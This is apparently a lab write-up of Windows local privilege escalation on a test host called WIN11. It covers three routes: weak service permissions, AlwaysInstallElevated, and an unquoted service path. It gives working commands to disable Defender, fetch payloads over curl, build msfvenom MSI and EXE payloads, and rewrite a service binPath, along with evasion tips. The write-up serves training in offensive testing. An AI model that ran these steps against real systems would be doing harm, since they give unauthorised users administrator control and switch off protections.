# Privilege Escalation — WIN11

**ATT&CK Techniques:** T1548.002 · T1574.009 · T1574.011

---

## Objective

Escalate from low-privilege local user `labuser` to local Administrator on WIN11 using three independent privilege escalation vectors discovered via WinPEAS enumeration.

---

## Environment

| Property | Value |
|---|---|
| Target | WIN11 — 192.168.60.20 |
| Starting shell | labuser (standard user, not in Administrators) |
| Goal | Local Administrator + admin flag |

---

## Tools Used

- WinPEAS
- msfvenom
- sc.exe (Windows built-in)
- msiexec (Windows built-in)
- net.exe (Windows built-in)

---

## Enumeration

Disabled Windows Defender real-time monitoring:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\labuser\Desktop"
```

Downloaded and ran WinPEAS from LNX HTTP server:
```powershell
curl http://192.168.60.10:8000/winpeas.exe -o C:\Users\labuser\Desktop\winpeas.exe
.\winpeas.exe
```

WinPEAS flagged three high-value findings:

```
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!

LabUpdate(LabUpdate)[C:\Windows\Temp\updater.exe] - Auto - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess

LabBackup(LabBackup)[C:\Program Files\Lab Tools\Backup Service\service.exe]
    Unquoted service path
```

---

## PE Vector 1: Weak Service Permissions — LabUpdate (T1574.011)

`LabUpdate` service has `AllAccess` permissions for `labuser`, allowing modification of the service binary path. Exploited using only built-in Windows tools — no malicious binary required:

```powershell
sc.exe config LabUpdate binPath= "cmd.exe /c net localgroup administrators labuser /add"
sc.exe start LabUpdate
```

**Output:**
```
Members: Administrator, LAB\Domain Admins, labuser, starboy
```

`labuser` added to local Administrators group via service binary path modification.

---

## PE Vector 2: AlwaysInstallElevated (T1548.002)

Both `HKLM` and `HKCU` registry keys set to `1` — any user can install MSI packages as SYSTEM. Generated a malicious MSI on Kali:

```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators labuser /add' -f msi -o /tmp/evil.msi
```

Transferred to WIN11 via LNX HTTP server:
```powershell
curl http://192.168.60.10:8000/evil.msi -o C:\Users\labuser\Desktop\evil.msi
msiexec /quiet /qn /i C:\Users\labuser\Desktop\evil.msi
```

MSI executed as SYSTEM — `labuser` added to local Administrators.

---

## PE Vector 3: Unquoted Service Path — LabBackup (T1574.009)

`LabBackup` service binary path is unquoted and contains spaces:
```
C:\Program Files\Lab Tools\Backup Service\service.exe
```

Windows resolves this path by trying each space-delimited segment first:
1. `C:\Program.exe`
2. `C:\Program Files\Lab.exe` ← our planted binary
3. `C:\Program Files\Lab Tools\Backup.exe`
4. `C:\Program Files\Lab Tools\Backup Service\service.exe`

`labuser` has write access to `C:\Program Files\Lab Tools\` — planted a malicious binary at position 2:

```bash
# On Kali
msfvenom -p windows/x64/exec CMD='net localgroup administrators labuser /add' -f exe -o /tmp/Lab.exe
scp /tmp/Lab.exe starboy@10.8.0.1:~/Lab.exe
```

```powershell
# On WIN11
curl http://192.168.60.10:8000/Lab.exe -o "C:\Program Files\Lab Tools\Lab.exe"
sc.exe start LabBackup
```

Windows executed `Lab.exe` instead of the legitimate service binary — `labuser` added to local Administrators.

---

## Admin Flag

Opened elevated PowerShell (Run as Administrator) after group membership updated:

```powershell
type C:\Users\Administrator\Desktop\admin.txt
```

**Output:**
```
admin{local_admin_via_pe_win11}
```

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1574.011 | Services Registry Permissions Weakness | LabUpdate service had AllAccess — binary path changed to execute net localgroup command |
| T1548.002 | AlwaysInstallElevated | Both registry keys set — malicious MSI executed as SYSTEM via msiexec |
| T1574.009 | Unquoted Service Path | Lab.exe planted in unquoted LabBackup service path — executed on service start |

---

## Key Takeaways

- WinPEAS reliably surfaces all three of these vectors — running it immediately after gaining a foothold should be standard practice
- AlwaysInstallElevated + weak service permissions are among the most common Windows PE findings in real engagements
- The LabUpdate exploit required zero custom tooling — `sc.exe` and `net.exe` are built-in Windows binaries, making this approach evasion-friendly
- Windows Defender Tamper Protection must be disabled via the GUI before PowerShell can fully disable real-time monitoring — pure PowerShell commands alone are insufficient on modern Windows 11 builds
- Group membership changes only take effect on the next login — spawn a new elevated session or re-login after adding a user to Administrators
